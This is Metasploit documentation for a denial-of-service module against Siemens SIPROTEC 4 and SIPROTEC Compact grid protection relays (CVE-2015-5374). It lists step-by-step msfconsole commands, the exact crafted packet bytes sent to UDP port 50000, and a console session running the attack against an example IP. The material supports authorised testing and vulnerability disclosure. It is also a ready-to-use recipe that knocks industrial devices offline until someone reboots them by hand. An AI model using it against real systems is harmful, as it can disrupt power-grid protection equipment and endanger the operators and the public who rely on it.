## Description

This module sends a specially crafted packet to Port 50000/UDP could cause a denial of service of the affected (Siemens SIPROTEC 4 and SIPROTEC Compact < V4.25) device. A manual reboot is required to return the device to service. 

## Vulnerable Application

Since this exploit hits the embedded software of a SCADA component, there is no vulnerable application for download on the web.
You may check the vendor's website for additional information. (http://w3.siemens.com/smartgrid/global/en/products-systems-solutions/downloads/Pages/SIPROTEC-4-Downloads.aspx)
You may also check the demo video: (https://drive.google.com/open?id=176ZC7nLJyJHGHPB3LbRxvLgArE9kOjPz)

## Verification Steps

- [ ] Start ```msfconsole```
- [ ] ```use auxiliary/dos/scada/siemens_siprotec4```
- [ ] Set ```RHOST <TARGET>```, replacing ```<TARGET>``` with the IP address you wish to attack.
- [ ] ```run```
- [ ] Verify that you see ```[*] Sending DoS packet ...```
- [ ] Verify that you see ```[*] Auxiliary module execution completed```
- [ ] Verify that the exploit sends a specially crafted packet which contains ```11 49 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 9E```

Document: (https://github.com/can/CVE-2015-5374-DoS-PoC/blob/master/README.md)
Metasploit Module is written based on this exploit: (https://www.exploit-db.com/exploits/44103/)

## Options

  ```set RHOST <TARGET_IP>```, ```set RPORT <TARGET_PORT> (Default 50000)```.

## Scenarios

  ```
msf auxiliary(siemens_siprotec4) > info

       Name: Siemens SIPROTEC 4 and SIPROTEC Compact EN100 Ethernet Module Denial of Service 
     Module: auxiliary/dos/scada/siemens_siprotec4
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  M. Can Kurnaz

Basic options:
  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  RHOST                   yes       The target address
  RPORT  50000            yes       The target port (UDP)

Description:
  This module sends a specially crafted packet to port 50000/UDP 
  causing a denial of service of the affected (Siemens SIPROTEC 4 and 
  SIPROTEC Compact < V4.25) devices. A manual reboot is required to return the 
  device to service. CVE-2015-5374 and a CVSS v2 base score of 7.8 
  have been assigned to this vulnerability.

References:
  https://ics-cert.us-cert.gov/advisories/ICSA-15-202-01
  https://www.exploit-db.com/exploits/44103/

msf auxiliary(siemens_siprotec4) > show options 

Module options (auxiliary/dos/scada/siemens_siprotec4):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  50000            yes       The target port (UDP)

msf auxiliary(siemens_siprotec4) > set rhost 192.168.1.61
rhost => 192.168.1.61
msf auxiliary(siemens_siprotec4) > run

[*] Sending DoS packet ... 
[*] Auxiliary module execution completed
msf auxiliary(siemens_siprotec4) > 
```
